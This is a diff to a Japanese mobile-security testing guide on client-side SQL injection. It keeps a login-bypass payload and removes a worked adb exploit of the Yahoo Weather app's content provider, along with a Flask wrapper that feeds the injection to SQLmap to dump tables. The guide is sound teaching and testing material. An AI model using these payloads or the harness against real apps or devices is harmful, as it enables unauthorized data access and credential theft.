@@ -43,46 +43,7 @@ SELECT * FROM users WHERE username='1' OR '1' = '1' AND Password='1' OR '1' = '1
 
 条件 `'1' = '1'` は常に true と評価されるため、このクエリはデータベース内のすべてのレコードを返し、有効なユーザーアカウントが入力されていなくてもログイン関数は "true" を返すようになります。
 
-Ostorlab はこの SQL インジェクションペイロードを使用して、adb で Yahoo 天気モバイルアプリケーションのソートパラメータを悪用しました。
-
-```shell
-$ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort '_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master/**/where/**/1=1\)'  
-
-Row: 0 _id=1, woeid=2487956, isCurrentLocation=0, latitude=NULL, longitude=NULL, photoWoeid=NULL, city=NULL, state=NULL, stateAbbr=, country=NULL, countryAbbr=, timeZoneId=NULL, timeZoneAbbr=NULL, lastUpdatedTimeMillis=746034814, crc=1591594725
-
-```
-
-ペイロードは次の `_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master\)` を使用することでさらに単純化できます。
-
-この SQL インジェクション脆弱性はユーザーがまだアクセスしていない機密データを開示してはいません。この例は adb を使用して脆弱なコンテンツプロバイダをテストする方法を示しています。Ostorlab はこれをさらに引き継ぎ、SQLite クエリのウェブページインスタンスを作成し、SQLmap を実行してテーブルをダンプします。
-
-```python
-import subprocess
-from flask import Flask, request
-
-app = Flask(__name__)
-
-URI = "com.yahoo.mobile.client.android.weather.provider.Weather/locations/"
-
-@app.route("/")
-def hello():
-
-   method = request.values['method']
-   sort = request.values['sort']
-   sort = "_id/**/limit/**/(SELECT/**/1/**/FROM/**/sqlite_master/**/WHERE/**/1={})".format(sort)
-   #sort = "_id/**/limit/**/({})".format(sort)
-
-   p = subprocess.Popen(["adb","shell","content",method,"--uri","content://{}".format(URI),"--sort",'"{}"'.format(sort)],stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-
-   o, e = p.communicate()
-
-   print "[*]SORT:{}".format(sort)
-   print "[*]OUTPUT:{}".format(o)
-   return "<html><divclass='output'>{}</div></html>".format(o)
-
-if __name__=="__main__":
-   app.run()
-```
+Ostorlab はこの SQL インジェクションペイロードを使用して、adb で [Yahoo 天気モバイルアプリケーション](https://blog.ostorlab.co/android-sql-contentProvider-sql-injections.html "Android, SQL and ContentProviders or Why SQL injections aren't dead yet ?") のソートパラメータを悪用しました。
 
 Mark Woods は QNAP NAS ストレージアプライアンス上で動作する "Qnotes" および "Qget" Android アプリ内にクライアントサイドの SQL インジェクションのリアルワールドのインスタンスの一つを発見しました。これらのアプリは SQL インジェクションに脆弱なコンテンツプロバイダをエクスポートし、攻撃者が NAS デバイスの資格情報を取得できるようにしました。この問題の詳細な説明は [Nettitude Blog](https://blog.nettitude.com/uk/qnap-android-dont-provide "Nettitude Blog - QNAP Android: Don't Over Provide") にあります。
 
